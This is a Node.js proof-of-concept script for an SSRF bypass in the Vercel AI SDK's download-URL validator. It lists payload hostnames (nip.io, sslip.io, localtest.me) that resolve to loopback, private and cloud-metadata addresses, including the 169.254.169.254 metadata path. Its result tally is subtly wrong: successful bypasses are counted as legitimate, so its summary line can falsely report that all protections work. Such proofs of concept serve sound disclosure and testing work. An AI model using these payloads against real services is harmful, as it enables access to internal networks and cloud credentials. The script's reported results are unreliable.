#!/usr/bin/env node
// PoC: SSRF bypass in Vercel AI SDK validateDownloadUrl
// Run: node scripts/poc-ssrf.mjs
// (from the vercel/ai repo root, or adjust the import path)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);

// Adjust this path to point to your built provider-utils package
const { validateDownloadUrl } = require(
  '/home/pro-g/Dev/vercel/ai/packages/provider-utils/dist/index.js'
);

const TEST_URLS = [
  // Direct private IPs (should be blocked — baseline test)
  { url: 'http://127.0.0.1/',            expect: 'blocked' },
  { url: 'http://localhost/',             expect: 'blocked' },
  { url: 'http://192.168.1.1/',           expect: 'blocked' },
  { url: 'http://10.0.0.1/',             expect: 'blocked' },
  { url: 'http://169.254.169.254/',       expect: 'blocked' },

  // DNS resolver bypasses (should also be blocked — these will pass)
  { url: 'http://localtest.me/',                  expect: 'bypass' },
  { url: 'http://lvh.me/',                        expect: 'bypass' },
  { url: 'http://127.0.0.1.nip.io/',              expect: 'bypass' },
  { url: 'http://169.254.169.254.nip.io/',         expect: 'bypass' },
  { url: 'http://169.254.169.254.nip.io/latest/meta-data/', expect: 'bypass' },
  { url: 'http://10.0.0.1.nip.io/',               expect: 'bypass' },
  { url: 'http://192.168.1.1.nip.io/',            expect: 'bypass' },
  { url: 'http://127.0.0.1.sslip.io/',            expect: 'bypass' },
  { url: 'http://169.254.169.254.sslip.io/',      expect: 'bypass' },

  // Legitimate URLs (should pass)
  { url: 'https://example.com/image.png', expect: 'allowed' },
  { url: 'http://example.com:8080/file',  expect: 'allowed' },
  { url: 'data:text/plain,hello',         expect: 'allowed' },
];

let blocked = 0, bypassed = 0, allowed = 0;

for (const { url, expect: expected } of TEST_URLS) {
  try {
    validateDownloadUrl(url);
    // No error = URL was allowed
    if (expected === 'blocked') {
      console.log(`FAIL ✗ : ${url.padEnd(60)} SHOULD HAVE BEEN BLOCKED`);
      bypassed++;  // unintentionally allowed
    } else {
      console.log(`  OK ✓ : ${url.padEnd(60)} (${expected})`);
      allowed++;
    }
  } catch (e) {
    if (expected === 'bypass') {
      console.log(`FAIL ✗ : ${url.padEnd(60)} BYPASS SHOULD HAVE WORKED — was blocked: ${e.message.substring(0, 60)}`);
      blocked++;
    } else {
      console.log(`  OK ✓ : ${url.padEnd(60)} (blocked as expected)`);
      blocked++;
    }
  }
}

console.log('\n=== RESULTS ===');
console.log(`  Blocked properly:  ${blocked}`);
console.log(`  Bypassed (vuln!):  ${bypassed}`);
console.log(`  Allowed (legit):   ${allowed}`);
console.log(`\n${bypassed > 0 ? `⚠️  ${bypassed} SSRF bypass(es) confirmed!` : '✅ All protections working.'}`);
